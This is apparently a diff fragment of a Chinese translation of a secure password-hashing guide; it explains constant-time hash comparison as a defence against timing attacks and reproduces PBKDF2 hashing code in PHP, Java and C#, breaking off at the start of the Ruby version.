+<p>基于这个原理，攻击者可以先找256个字符串，他们的hash都是以不同的字节开头。然后发送到目标服务器，计算服务器返回的时间。时间最长的那一个就是第一个字节hash是正确的。依次类推。攻击者就可能得到hash更多的字节。</p>
+<p>这种攻击听起来好像在网络上实现起来比较困难。但是已经有人实现过了。所以我们在比较hash的时候采用了花费时间固定的函数。</p>
+<p>本文提供的代码中 slowequals 函数是怎么工作的</p>
+<p>上一回答讲到了我们需要比较时间固定的函数，这部分详细讲一下代码的实现。</p>
+<pre><code><span class="number">1</span>.     <span class="keyword">private</span> <span class="keyword">static</span> boolean slowEquals(byte[] a, byte[] b)
+<span class="number">2</span>.     <span class="comment">{
+3.         int diff = a.length ^ b.length;
+4.         for(int i = 0; i &lt; a.length &amp;&amp; i &lt; b.length; i++)
+5.             diff |= a[i] ^ b[i];
+6.         return diff == 0;
+7.     }</span>
+</code></pre><p>这段代码使用了异或(XOR)操作符”^”来比较整数是否相等，而没有使用”==”操作符。原因在于如果两个数完全一致，异或之后的值为零。因为 0 XOR 0 = 0, 1 XOR 1 = 0, 0 XOR 1 = 1, 1 XOR 0 = 1。</p>
+<p>所以，第一行代码如果a.length等于b.length，变量diff等于0,否则的话diff就是一个非零的值。然后，让a，b的每一个字节XOR之后再跟diff OR。这样，只有diff一开始是0,并且，a，b的每一个字节XOR的结果也是零，最后循环完成后diff的值才是0,这种情况是a，b完全一样。否则最后diff是一个非零的值。</p>
+<p>我们使用XOR而不适用”==”的原因是”==”通常编译成分支的形式。比如C代码”diff &amp;= a == b” 可能编译成下面的X86汇编。</p>
+<pre><code><span class="keyword">MOV</span> <span class="literal">EAX</span>, [A]
+<span class="keyword">CMP</span> [B], <span class="literal">EAX</span>
+<span class="keyword">JZ</span> equal
+<span class="keyword">JMP</span> done
+<span class="label">equal:</span>
+<span class="keyword">AND</span> [VALID], <span class="number">1</span>
+<span class="label">done:</span>
+<span class="keyword">AND</span> [VALID], <span class="number">0</span>
+</code></pre><p>分支会导致代码执行的时间出现差异。</p>
+<p>C代码的”diff |= a ^ b”编译之后类似于，</p>
+<pre><code><span class="keyword">MOV</span> <span class="literal">EAX</span>, [A]
+<span class="keyword">XOR</span> <span class="literal">EAX</span>, [B]
+<span class="keyword">OR</span> [DIFF], <span class="literal">EAX</span>
+</code></pre><p>执行时间跟两个变量是否相等没有关系。</p>
+<p>为什么要讨论这么多关于hash的东西</p>
+<p>用户在你的网站上输入密码，是相信你的安全性。如果你的数据库被黑了。而用户密码又没有恰当的保护，那么恶意的攻击者就可以利用这些密码尝试登陆其他的网站和服务。进行撞库攻击。(很多用户在所有的地方都是使用相同的密码)这不仅仅是你的网站安全，是你的所有用户的安全。你要对你用户的安全负责。</p>
+<p>PHP PBKDF2 密码hash代码<br>代码下载</p>
+<pre><code>&lt;?php
+<span class="comment">/*
+ * Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
+ * Copyright (c) 2013, Taylor Hornby
+ * All rights reserved.
+ *
+ * Redistribution and use in source and binary forms, with or without 
+ * modification, are permitted provided that the following conditions are met:
+ *
+ * 1. Redistributions of source code must retain the above copyright notice, 
+ * this list of conditions and the following disclaimer.
+ *
+ * 2. Redistributions in binary form must reproduce the above copyright notice,
+ * this list of conditions and the following disclaimer in the documentation 
+ * and/or other materials provided with the distribution.
+ *
+ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
+ * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
+ * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
+ * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
+ * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
+ * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
+ * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
+ * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
+ * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
+ * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
+ * POSSIBILITY OF SUCH DAMAGE.
+ */</span>
+<span class="comment">// These constants may be changed without breaking existing hashes.</span>
+define(<span class="string">"PBKDF2_HASH_ALGORITHM"</span>, <span class="string">"sha256"</span>);
+define(<span class="string">"PBKDF2_ITERATIONS"</span>, <span class="number">1000</span>);
+define(<span class="string">"PBKDF2_SALT_BYTE_SIZE"</span>, <span class="number">24</span>);
+define(<span class="string">"PBKDF2_HASH_BYTE_SIZE"</span>, <span class="number">24</span>);
+define(<span class="string">"HASH_SECTIONS"</span>, <span class="number">4</span>);
+define(<span class="string">"HASH_ALGORITHM_INDEX"</span>, <span class="number">0</span>);
+define(<span class="string">"HASH_ITERATION_INDEX"</span>, <span class="number">1</span>);
+define(<span class="string">"HASH_SALT_INDEX"</span>, <span class="number">2</span>);
+define(<span class="string">"HASH_PBKDF2_INDEX"</span>, <span class="number">3</span>);
+function create_hash($password)
+{
+    <span class="comment">// format: algorithm:iterations:salt:hash</span>
+    $salt = base64_encode(mcrypt_create_iv(PBKDF2_SALT_BYTE_SIZE, MCRYPT_DEV_URANDOM));
+    <span class="keyword">return</span> PBKDF2_HASH_ALGORITHM . <span class="string">":"</span> . PBKDF2_ITERATIONS . <span class="string">":"</span> .  $salt . <span class="string">":"</span> .
+        base64_encode(pbkdf2(
+            PBKDF2_HASH_ALGORITHM,
+            $password,
+            $salt,
+            PBKDF2_ITERATIONS,
+            PBKDF2_HASH_BYTE_SIZE,
+            <span class="keyword">true</span>
+        ));
+}
+function validate_password($password, $correct_hash)
+{
+    $params = explode(<span class="string">":"</span>, $correct_hash);
+    <span class="keyword">if</span>(count($params) &lt; HASH_SECTIONS)
+       <span class="keyword">return</span> <span class="keyword">false</span>;
+    $pbkdf2 = base64_decode($params[HASH_PBKDF2_INDEX]);
+    <span class="keyword">return</span> slow_equals(
+        $pbkdf2,
+        pbkdf2(
+            $params[HASH_ALGORITHM_INDEX],
+            $password,
+            $params[HASH_SALT_INDEX],
+            (<span class="built_in">int</span>)$params[HASH_ITERATION_INDEX],
+            strlen($pbkdf2),
+            <span class="keyword">true</span>
+        )
+    );
+}
+<span class="comment">// Compares two strings $a and $b in length-constant time.</span>
+function slow_equals($a, $b)
+{
+    $diff = strlen($a) ^ strlen($b);
+    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($a) &amp;&amp; $i &lt; strlen($b); $i++)
+    {
+        $diff |= ord($a[$i]) ^ ord($b[$i]);
+    }
+    <span class="keyword">return</span> $diff === <span class="number">0</span>;
+}
+<span class="comment">/*
+ * PBKDF2 key derivation function as defined by RSA's PKCS #5: https://www.ietf.org/rfc/rfc2898.txt
+ * $algorithm - The hash algorithm to use. Recommended: SHA256
+ * $password - The password.
+ * $salt - A salt that is unique to the password.
+ * $count - Iteration count. Higher is better, but slower. Recommended: At least 1000.
+ * $key_length - The length of the derived key in bytes.
+ * $raw_output - If true, the key is returned in raw binary format. Hex encoded otherwise.
+ * Returns: A $key_length-byte key derived from the password and salt.
+ *
+ * Test vectors can be found here: https://www.ietf.org/rfc/rfc6070.txt
+ *
+ * This implementation of PBKDF2 was originally created by https://defuse.ca
+ * With improvements by http://www.variations-of-shadow.com
+ */</span>
+function pbkdf2($algorithm, $password, $salt, $count, $key_length, $raw_output = <span class="keyword">false</span>)
+{
+    $algorithm = strtolower($algorithm);
+    <span class="keyword">if</span>(!in_array($algorithm, hash_algos(), <span class="keyword">true</span>))
+        trigger_error(<span class="string">'PBKDF2 ERROR: Invalid hash algorithm.'</span>, E_USER_ERROR);
+    <span class="keyword">if</span>($count &lt;= <span class="number">0</span> || $key_length &lt;= <span class="number">0</span>)
+        trigger_error(<span class="string">'PBKDF2 ERROR: Invalid parameters.'</span>, E_USER_ERROR);
+    <span class="keyword">if</span> (function_exists(<span class="string">"hash_pbkdf2"</span>)) {
+        <span class="comment">// The output length is in NIBBLES (4-bits) if $raw_output is false!</span>
+        <span class="keyword">if</span> (!$raw_output) {
+            $key_length = $key_length * <span class="number">2</span>;
+        }
+        <span class="keyword">return</span> hash_pbkdf2($algorithm, $password, $salt, $count, $key_length, $raw_output);
+    }
+    $hash_length = strlen(hash($algorithm, <span class="string">""</span>, <span class="keyword">true</span>));
+    $block_count = <span class="built_in">ceil</span>($key_length / $hash_length);
+    $output = <span class="string">""</span>;
+    <span class="keyword">for</span>($i = <span class="number">1</span>; $i &lt;= $block_count; $i++) {
+        <span class="comment">// $i encoded as 4 bytes, big endian.</span>
+        $last = $salt . pack(<span class="string">"N"</span>, $i);
+        <span class="comment">// first iteration</span>
+        $last = $xorsum = hash_hmac($algorithm, $last, $password, <span class="keyword">true</span>);
+        <span class="comment">// perform the other $count - 1 iterations</span>
+        <span class="keyword">for</span> ($j = <span class="number">1</span>; $j &lt; $count; $j++) {
+            $xorsum ^= ($last = hash_hmac($algorithm, $last, $password, <span class="keyword">true</span>));
+        }
+        $output .= $xorsum;
+    }
+    <span class="keyword">if</span>($raw_output)
+        <span class="keyword">return</span> substr($output, <span class="number">0</span>, $key_length);
+    <span class="keyword">else</span>
+        <span class="keyword">return</span> bin2hex(substr($output, <span class="number">0</span>, $key_length));
+}
+?&gt;
+java PBKDF2 密码hash代码
+代码下载
+
+<span class="comment">/* 
+ * Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
+ * Copyright (c) 2013, Taylor Hornby
+ * All rights reserved.
+ *
+ * Redistribution and use in source and binary forms, with or without 
+ * modification, are permitted provided that the following conditions are met:
+ *
+ * 1. Redistributions of source code must retain the above copyright notice, 
+ * this list of conditions and the following disclaimer.
+ *
+ * 2. Redistributions in binary form must reproduce the above copyright notice,
+ * this list of conditions and the following disclaimer in the documentation 
+ * and/or other materials provided with the distribution.
+ *
+ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
+ * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
+ * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
+ * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
+ * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
+ * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
+ * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
+ * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
+ * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
+ * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
+ * POSSIBILITY OF SUCH DAMAGE.
+ */</span>
+
+<span class="keyword">import</span> java.security.SecureRandom;
+<span class="keyword">import</span> javax.crypto.spec.PBEKeySpec;
+<span class="keyword">import</span> javax.crypto.SecretKeyFactory;
+<span class="keyword">import</span> java.math.BigInteger;
+<span class="keyword">import</span> java.security.NoSuchAlgorithmException;
+<span class="keyword">import</span> java.security.spec.InvalidKeySpecException;
+
+<span class="comment">/*
+ * PBKDF2 salted password hashing.
+ * Author: havoc AT defuse.ca
+ * www: http://crackstation.net/hashing-security.htm
+ */</span>
+<span class="keyword">public</span> class PasswordHash
+{
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">String</span> PBKDF2_ALGORITHM = <span class="string">"PBKDF2WithHmacSHA1"</span>;
+
+    <span class="comment">// The following constants may be changed without breaking existing hashes.</span>
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="built_in">int</span> SALT_BYTE_SIZE = <span class="number">24</span>;
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="built_in">int</span> HASH_BYTE_SIZE = <span class="number">24</span>;
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="built_in">int</span> PBKDF2_ITERATIONS = <span class="number">1000</span>;
+
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="built_in">int</span> ITERATION_INDEX = <span class="number">0</span>;
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="built_in">int</span> SALT_INDEX = <span class="number">1</span>;
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="built_in">int</span> PBKDF2_INDEX = <span class="number">2</span>;
+
+    <span class="comment">/**
+     * Returns a salted PBKDF2 hash of the password.
+     *
+     * @param   password    the password to hash
+     * @return              a salted PBKDF2 hash of the password
+     */</span>
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">String</span> createHash(<span class="keyword">String</span> password)
+        <span class="keyword">throws</span> NoSuchAlgorithmException, InvalidKeySpecException
+    {
+        <span class="keyword">return</span> createHash(password.toCharArray());
+    }
+
+    <span class="comment">/**
+     * Returns a salted PBKDF2 hash of the password.
+     *
+     * @param   password    the password to hash
+     * @return              a salted PBKDF2 hash of the password
+     */</span>
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">String</span> createHash(<span class="built_in">char</span>[] password)
+        <span class="keyword">throws</span> NoSuchAlgorithmException, InvalidKeySpecException
+    {
+        <span class="comment">// Generate a random salt</span>
+        SecureRandom <span class="built_in">random</span> = <span class="keyword">new</span> SecureRandom();
+        <span class="built_in">byte</span>[] salt = <span class="keyword">new</span> <span class="built_in">byte</span>[SALT_BYTE_SIZE];
+        <span class="built_in">random</span>.nextBytes(salt);
+
+        <span class="comment">// Hash the password</span>
+        <span class="built_in">byte</span>[] hash = pbkdf2(password, salt, PBKDF2_ITERATIONS, HASH_BYTE_SIZE);
+        <span class="comment">// format iterations:salt:hash</span>
+        <span class="keyword">return</span> PBKDF2_ITERATIONS + <span class="string">":"</span> + toHex(salt) + <span class="string">":"</span> +  toHex(hash);
+    }
+
+    <span class="comment">/**
+     * Validates a password using a hash.
+     *
+     * @param   password        the password to check
+     * @param   correctHash     the hash of the valid password
+     * @return                  true if the password is correct, false if not
+     */</span>
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">boolean</span> validatePassword(<span class="keyword">String</span> password, <span class="keyword">String</span> correctHash)
+        <span class="keyword">throws</span> NoSuchAlgorithmException, InvalidKeySpecException
+    {
+        <span class="keyword">return</span> validatePassword(password.toCharArray(), correctHash);
+    }
+
+    <span class="comment">/**
+     * Validates a password using a hash.
+     *
+     * @param   password        the password to check
+     * @param   correctHash     the hash of the valid password
+     * @return                  true if the password is correct, false if not
+     */</span>
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">boolean</span> validatePassword(<span class="built_in">char</span>[] password, <span class="keyword">String</span> correctHash)
+        <span class="keyword">throws</span> NoSuchAlgorithmException, InvalidKeySpecException
+    {
+        <span class="comment">// Decode the hash into its parameters</span>
+        <span class="keyword">String</span>[] params = correctHash.<span class="built_in">split</span>(<span class="string">":"</span>);
+        <span class="built_in">int</span> iterations = Integer.parseInt(params[ITERATION_INDEX]);
+        <span class="built_in">byte</span>[] salt = fromHex(params[SALT_INDEX]);
+        <span class="built_in">byte</span>[] hash = fromHex(params[PBKDF2_INDEX]);
+        <span class="comment">// Compute the hash of the provided password, using the same salt, </span>
+        <span class="comment">// iteration count, and hash length</span>
+        <span class="built_in">byte</span>[] testHash = pbkdf2(password, salt, iterations, hash.length);
+        <span class="comment">// Compare the hashes in constant time. The password is correct if</span>
+        <span class="comment">// both hashes match.</span>
+        <span class="keyword">return</span> slowEquals(hash, testHash);
+    }
+
+    <span class="comment">/**
+     * Compares two byte arrays in length-constant time. This comparison method
+     * is used so that password hashes cannot be extracted from an on-line 
+     * system using a timing attack and then attacked off-line.
+     * 
+     * @param   a       the first byte array
+     * @param   b       the second byte array 
+     * @return          true if both byte arrays are the same, false if not
+     */</span>
+    <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">boolean</span> slowEquals(<span class="built_in">byte</span>[] a, <span class="built_in">byte</span>[] b)
+    {
+        <span class="built_in">int</span> diff = a.length ^ b.length;
+        <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; a.length &amp;&amp; i &lt; b.length; i++)
+            diff |= a[i] ^ b[i];
+        <span class="keyword">return</span> diff == <span class="number">0</span>;
+    }
+
+    <span class="comment">/**
+     *  Computes the PBKDF2 hash of a password.
+     *
+     * @param   password    the password to hash.
+     * @param   salt        the salt
+     * @param   iterations  the iteration count (slowness factor)
+     * @param   bytes       the length of the hash to compute in bytes
+     * @return              the PBDKF2 hash of the password
+     */</span>
+    <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] pbkdf2(<span class="built_in">char</span>[] password, <span class="built_in">byte</span>[] salt, <span class="built_in">int</span> iterations, <span class="built_in">int</span> bytes)
+        <span class="keyword">throws</span> NoSuchAlgorithmException, InvalidKeySpecException
+    {
+        PBEKeySpec spec = <span class="keyword">new</span> PBEKeySpec(password, salt, iterations, bytes * <span class="number">8</span>);
+        SecretKeyFactory skf = SecretKeyFactory.getInstance(PBKDF2_ALGORITHM);
+        <span class="keyword">return</span> skf.generateSecret(spec).getEncoded();
+    }
+
+    <span class="comment">/**
+     * Converts a string of hexadecimal characters into a byte array.
+     *
+     * @param   hex         the hex string
+     * @return              the hex string decoded into a byte array
+     */</span>
+    <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] fromHex(<span class="keyword">String</span> <span class="built_in">hex</span>)
+    {
+        <span class="built_in">byte</span>[] <span class="built_in">binary</span> = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="built_in">hex</span>.length() / <span class="number">2</span>];
+        <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">binary</span>.length; i++)
+        {
+            <span class="built_in">binary</span>[i] = (<span class="built_in">byte</span>)Integer.parseInt(<span class="built_in">hex</span>.substring(<span class="number">2</span>*i, <span class="number">2</span>*i+<span class="number">2</span>), <span class="number">16</span>);
+        }
+        <span class="keyword">return</span> <span class="built_in">binary</span>;
+    }
+
+    <span class="comment">/**
+     * Converts a byte array into a hexadecimal string.
+     *
+     * @param   array       the byte array to convert
+     * @return              a length*2 character string encoding the byte array
+     */</span>
+    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">String</span> toHex(<span class="built_in">byte</span>[] array)
+    {
+        BigInteger bi = <span class="keyword">new</span> BigInteger(<span class="number">1</span>, array);
+        <span class="keyword">String</span> <span class="built_in">hex</span> = bi.toString(<span class="number">16</span>);
+        <span class="built_in">int</span> paddingLength = (array.length * <span class="number">2</span>) - <span class="built_in">hex</span>.length();
+        <span class="keyword">if</span>(paddingLength &gt; <span class="number">0</span>)
+            <span class="keyword">return</span> <span class="keyword">String</span>.format(<span class="string">"%0"</span> + paddingLength + <span class="string">"d"</span>, <span class="number">0</span>) + <span class="built_in">hex</span>;
+        <span class="keyword">else</span>
+            <span class="keyword">return</span> <span class="built_in">hex</span>;
+    }
+
+    <span class="comment">/**
+     * Tests the basic functionality of the PasswordHash class
+     *
+     * @param   args        ignored
+     */</span>
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args)
+    {
+        <span class="keyword">try</span>
+        {
+            <span class="comment">// Print out 10 hashes</span>
+            <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)
+                System.out.<span class="built_in">println</span>(PasswordHash.createHash(<span class="string">"p\r\nassw0Rd!"</span>));
+
+            <span class="comment">// Test password validation</span>
+            <span class="built_in">boolean</span> failure = <span class="keyword">false</span>;
+            System.out.<span class="built_in">println</span>(<span class="string">"Running tests..."</span>);
+            <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)
+            {
+                <span class="keyword">String</span> password = <span class="string">""</span>+i;
+                <span class="keyword">String</span> hash = createHash(password);
+                <span class="keyword">String</span> secondHash = createHash(password);
+                <span class="keyword">if</span>(hash.equals(secondHash)) {
+                    System.out.<span class="built_in">println</span>(<span class="string">"FAILURE: TWO HASHES ARE EQUAL!"</span>);
+                    failure = <span class="keyword">true</span>;
+                }
+                <span class="keyword">String</span> wrongPassword = <span class="string">""</span>+(i+<span class="number">1</span>);
+                <span class="keyword">if</span>(validatePassword(wrongPassword, hash)) {
+                    System.out.<span class="built_in">println</span>(<span class="string">"FAILURE: WRONG PASSWORD ACCEPTED!"</span>);
+                    failure = <span class="keyword">true</span>;
+                }
+                <span class="keyword">if</span>(!validatePassword(password, hash)) {
+                    System.out.<span class="built_in">println</span>(<span class="string">"FAILURE: GOOD PASSWORD NOT ACCEPTED!"</span>);
+                    failure = <span class="keyword">true</span>;
+                }
+            }
+            <span class="keyword">if</span>(failure)
+                System.out.<span class="built_in">println</span>(<span class="string">"TESTS FAILED!"</span>);
+            <span class="keyword">else</span>
+                System.out.<span class="built_in">println</span>(<span class="string">"TESTS PASSED!"</span>);
+        }
+        <span class="keyword">catch</span>(Exception ex)
+        {
+            System.out.<span class="built_in">println</span>(<span class="string">"ERROR: "</span> + ex);
+        }
+    }
+
+}
+ASP.NET (C#)密码hash代码
+代码下载
+
+<span class="comment">/* 
+ * Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
+ * Copyright (c) 2013, Taylor Hornby
+ * All rights reserved.
+ *
+ * Redistribution and use in source and binary forms, with or without 
+ * modification, are permitted provided that the following conditions are met:
+ *
+ * 1. Redistributions of source code must retain the above copyright notice, 
+ * this list of conditions and the following disclaimer.
+ *
+ * 2. Redistributions in binary form must reproduce the above copyright notice,
+ * this list of conditions and the following disclaimer in the documentation 
+ * and/or other materials provided with the distribution.
+ *
+ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
+ * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
+ * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
+ * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
+ * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
+ * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
+ * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
+ * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
+ * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
+ * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
+ * POSSIBILITY OF SUCH DAMAGE.
+ */</span>
+
+using System;
+using System.Text;
+using System.Security.Cryptography;
+
+namespace PasswordHash
+{
+    <span class="comment">/// &lt;summary&gt;</span>
+    <span class="comment">/// Salted password hashing with PBKDF2-SHA1.</span>
+    <span class="comment">/// Author: havoc AT defuse.ca</span>
+    <span class="comment">/// www: http://crackstation.net/hashing-security.htm</span>
+    <span class="comment">/// Compatibility: .NET 3.0 and later.</span>
+    <span class="comment">/// &lt;/summary&gt;</span>
+    <span class="keyword">public</span> class PasswordHash
+    {
+        <span class="comment">// The following constants may be changed without breaking existing hashes.</span>
+        <span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">int</span> SALT_BYTE_SIZE = <span class="number">24</span>;
+        <span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">int</span> HASH_BYTE_SIZE = <span class="number">24</span>;
+        <span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">int</span> PBKDF2_ITERATIONS = <span class="number">1000</span>;
+
+        <span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">int</span> ITERATION_INDEX = <span class="number">0</span>;
+        <span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">int</span> SALT_INDEX = <span class="number">1</span>;
+        <span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">int</span> PBKDF2_INDEX = <span class="number">2</span>;
+
+        <span class="comment">/// &lt;summary&gt;</span>
+        <span class="comment">/// Creates a salted PBKDF2 hash of the password.</span>
+        <span class="comment">/// &lt;/summary&gt;</span>
+        <span class="comment">/// &lt;param name="password"&gt;The password to hash.&lt;/param&gt;</span>
+        <span class="comment">/// &lt;returns&gt;The hash of the password.&lt;/returns&gt;</span>
+        <span class="keyword">public</span> <span class="keyword">static</span> string CreateHash(string password)
+        {
+            <span class="comment">// Generate a random salt</span>
+            RNGCryptoServiceProvider csprng = <span class="keyword">new</span> RNGCryptoServiceProvider();
+            <span class="built_in">byte</span>[] salt = <span class="keyword">new</span> <span class="built_in">byte</span>[SALT_BYTE_SIZE];
+            csprng.GetBytes(salt);
+
+            <span class="comment">// Hash the password and encode the parameters</span>
+            <span class="built_in">byte</span>[] hash = PBKDF2(password, salt, PBKDF2_ITERATIONS, HASH_BYTE_SIZE);
+            <span class="keyword">return</span> PBKDF2_ITERATIONS + <span class="string">":"</span> +
+                Convert.ToBase64String(salt) + <span class="string">":"</span> +
+                Convert.ToBase64String(hash);
+        }
+
+        <span class="comment">/// &lt;summary&gt;</span>
+        <span class="comment">/// Validates a password given a hash of the correct one.</span>
+        <span class="comment">/// &lt;/summary&gt;</span>
+        <span class="comment">/// &lt;param name="password"&gt;The password to check.&lt;/param&gt;</span>
+        <span class="comment">/// &lt;param name="correctHash"&gt;A hash of the correct password.&lt;/param&gt;</span>
+        <span class="comment">/// &lt;returns&gt;True if the password is correct. False otherwise.&lt;/returns&gt;</span>
+        <span class="keyword">public</span> <span class="keyword">static</span> bool ValidatePassword(string password, string correctHash)
+        {
+            <span class="comment">// Extract the parameters from the hash</span>
+            <span class="built_in">char</span>[] delimiter = { <span class="string">':'</span> };
+            string[] <span class="built_in">split</span> = correctHash.Split(delimiter);
+            <span class="built_in">int</span> iterations = Int32.Parse(<span class="built_in">split</span>[ITERATION_INDEX]);
+            <span class="built_in">byte</span>[] salt = Convert.FromBase64String(<span class="built_in">split</span>[SALT_INDEX]);
+            <span class="built_in">byte</span>[] hash = Convert.FromBase64String(<span class="built_in">split</span>[PBKDF2_INDEX]);
+
+            <span class="built_in">byte</span>[] testHash = PBKDF2(password, salt, iterations, hash.Length);
+            <span class="keyword">return</span> SlowEquals(hash, testHash);
+        }
+
+        <span class="comment">/// &lt;summary&gt;</span>
+        <span class="comment">/// Compares two byte arrays in length-constant time. This comparison</span>
+        <span class="comment">/// method is used so that password hashes cannot be extracted from</span>
+        <span class="comment">/// on-line systems using a timing attack and then attacked off-line.</span>
+        <span class="comment">/// &lt;/summary&gt;</span>
+        <span class="comment">/// &lt;param name="a"&gt;The first byte array.&lt;/param&gt;</span>
+        <span class="comment">/// &lt;param name="b"&gt;The second byte array.&lt;/param&gt;</span>
+        <span class="comment">/// &lt;returns&gt;True if both byte arrays are equal. False otherwise.&lt;/returns&gt;</span>
+        <span class="keyword">private</span> <span class="keyword">static</span> bool SlowEquals(<span class="built_in">byte</span>[] a, <span class="built_in">byte</span>[] b)
+        {
+            uint diff = (uint)a.Length ^ (uint)b.Length;
+            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; a.Length &amp;&amp; i &lt; b.Length; i++)
+                diff |= (uint)(a[i] ^ b[i]);
+            <span class="keyword">return</span> diff == <span class="number">0</span>;
+        }
+
+        <span class="comment">/// &lt;summary&gt;</span>
+        <span class="comment">/// Computes the PBKDF2-SHA1 hash of a password.</span>
+        <span class="comment">/// &lt;/summary&gt;</span>
+        <span class="comment">/// &lt;param name="password"&gt;The password to hash.&lt;/param&gt;</span>
+        <span class="comment">/// &lt;param name="salt"&gt;The salt.&lt;/param&gt;</span>
+        <span class="comment">/// &lt;param name="iterations"&gt;The PBKDF2 iteration count.&lt;/param&gt;</span>
+        <span class="comment">/// &lt;param name="outputBytes"&gt;The length of the hash to generate, in bytes.&lt;/param&gt;</span>
+        <span class="comment">/// &lt;returns&gt;A hash of the password.&lt;/returns&gt;</span>
+        <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] PBKDF2(string password, <span class="built_in">byte</span>[] salt, <span class="built_in">int</span> iterations, <span class="built_in">int</span> outputBytes)
+        {
+            Rfc2898DeriveBytes pbkdf2 = <span class="keyword">new</span> Rfc2898DeriveBytes(password, salt);
+            pbkdf2.IterationCount = iterations;
+            <span class="keyword">return</span> pbkdf2.GetBytes(outputBytes);
+        }
+    }
+}
+Ruby (on Rails) 密码hash代码
+代码下载
+
+# Password Hashing With PBKDF2 (http:<span class="comment">//crackstation.net/hashing-security.htm).</span>
+# Copyright (c) <span class="number">2013</span>, Taylor Hornby
+# All rights reserved.
+# 
+# Redistribution and use in source and <span class="built_in">binary</span> forms, with or without 
+# modification, are permitted provided that the following conditions are met:
+# 
+# <span class="number">1.</span> Redistributions of source code must retain the above copyright notice, 
+# <span class="keyword">this</span> list of conditions and the following disclaimer.
+# 
